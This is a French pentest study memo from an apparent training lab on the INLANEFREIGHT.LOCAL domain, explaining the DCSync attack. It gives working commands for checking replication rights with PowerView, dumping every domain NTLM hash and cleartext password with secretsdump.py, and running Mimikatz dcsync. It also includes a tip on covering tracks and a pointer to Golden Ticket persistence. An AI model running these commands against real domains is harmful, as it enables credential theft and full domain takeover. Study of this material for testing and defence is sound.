# Mémo — DCSync (compromission totale du domaine)

> Suite de l'[ACL Abuse](memo-acl-abuse-tactics.md) : on contrôle `adunn`, qui a les droits de **réplication**.
> DCSync = se faire passer pour un DC et lui demander de **répliquer** les secrets AD → on récupère **tous les hash NTLM** du domaine.
> Domaine : `INLANEFREIGHT.LOCAL`. DC : `172.16.5.5`. Host Linux (secretsdump) : `172.16.5.225`.

---

## 1. C'est quoi / comment ça marche

- Abuse du **Directory Replication Service Remote Protocol** (le protocole que les DC utilisent entre eux pour se synchroniser).
- Le cœur : l'extended right **`DS-Replication-Get-Changes-All`** → permet de répliquer les données **secrètes** (hash).
- Il faut un compte avec **Replicating Directory Changes** + **Replicating Directory Changes All**.
  - Par défaut : **Domain Admins**, **Enterprise Admins**, admin par défaut du domaine.
  - ⚠️ En vrai on trouve souvent des **comptes standards** à qui on a filé ces droits (comme `adunn` ici) → même impact.
- On récupère le hash NTLM **actuel** de chaque user + ceux de leurs **anciens** mots de passe (`-history`).

> Si on a **WriteDacl** sur l'objet domaine : on peut **s'ajouter** ces droits, faire le DCSync, puis **les retirer** pour couvrir ses traces.

---

## 2. Vérifier les droits de réplication (PowerView)

```powershell
# SID de l'utilisateur
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs `
  | ? { $_.ObjectAceType -match 'Replication-Get' } `
  | ? { $_.SecurityIdentifier -match $sid } `
  | select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
On veut voir ces `ObjectAceType` pour notre SID :
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All` ← **le droit clé**
- (`...-In-Filtered-Set` en bonus)

---

## 3. DCSync depuis Linux — secretsdump.py (Impacket)

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
# Password: <mdp de adunn>
```
- `-just-dc` = extrait **hash NTLM + clés Kerberos** depuis NTDS.dit.
- Sortie : `domaine\user:rid:lmhash:nthash:::` (ex. `administrator:500:...:88ad09182de639ccc6579eb0849751cf:::`).

### 3 fichiers générés par `-just-dc`
| Fichier | Contenu |
|---------|---------|
| `*.ntds` | hash NTLM |
| `*.ntds.kerberos` | clés Kerberos |
| `*.ntds.cleartext` | mots de passe **en clair** (comptes en *reversible encryption*) |

### Flags utiles
| Flag | Usage |
|------|-------|
| `-just-dc-ntlm` | NTLM uniquement |
| `-just-dc-user <USER>` | un seul user |
| `-pwd-last-set` | date du dernier changement de mdp |
| `-history` | historique des mdp (utile pour le crack / métriques) |
| `-user-status` | marque les comptes désactivés (→ les exclure des stats de crack) |

> 📊 Pour le rapport client : % de mdp cassés, top 10, longueur, réutilisation — **sur les comptes actifs seulement** (d'où `-user-status`).

---

## 4. Reversible encryption (mdp « en clair »)

- Flag `ENCRYPTED_TEXT_PWD_ALLOWED` (userAccountControl bit `128`).
- ⚠️ Pas vraiment du clair : stocké en **RC4**, la clé (**Syskey**) est dans le registre → déchiffrable par un DA / via DCSync.
- `secretsdump.py` **déchiffre** automatiquement ces mdp → fichier `.cleartext`.
- Reste chiffré en reversible **jusqu'au prochain changement** de mdp du compte.

### Énumérer les comptes concernés
```powershell
# PowerShell natif (bit 128)
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# PowerView
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```
```bash
cat inlanefreight_hashes.ntds.cleartext
# proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

---

## 5. DCSync depuis Windows — Mimikatz

Mimikatz doit tourner **dans le contexte** du user qui a les droits DCSync → `runas /netonly` :
```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
Puis dans la session spawntée :
```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
# → Hash NTLM: 88ad09182de639ccc6579eb0849751cf
```
- Mimikatz cible **un** user précis (ici `administrator`).
- On pourrait cibler **`krbtgt`** → **Golden Ticket** (persistance, hors scope du module).
- Alternative Windows : `Invoke-DCSync`.

---

## 6. À retenir

| Point | Détail |
|-------|--------|
| Droit clé | **DS-Replication-Get-Changes-All** (+ Get-Changes) |
| Qui l'a par défaut | Domain/Enterprise Admins, admin domaine |
| Vérif PowerView | `Get-ObjectAcl "DC=..." -ResolveGUIDs` + filtre `Replication-Get` |
| Linux | `secretsdump.py -just-dc INLANEFREIGHT/adunn@<DC>` |
| Windows | `runas /netonly` → `lsadump::dcsync /user:...` |
| 3 fichiers | `.ntds` / `.ntds.kerberos` / `.ntds.cleartext` |
| Reversible encryption | bit UAC **128**, RC4 + Syskey → déchiffré par secretsdump |
| WriteDacl sur domaine | s'ajouter les droits → DCSync → retirer (OPSEC) |
| Cible admin | compromission totale ; cible `krbtgt` → Golden Ticket (persistance) |
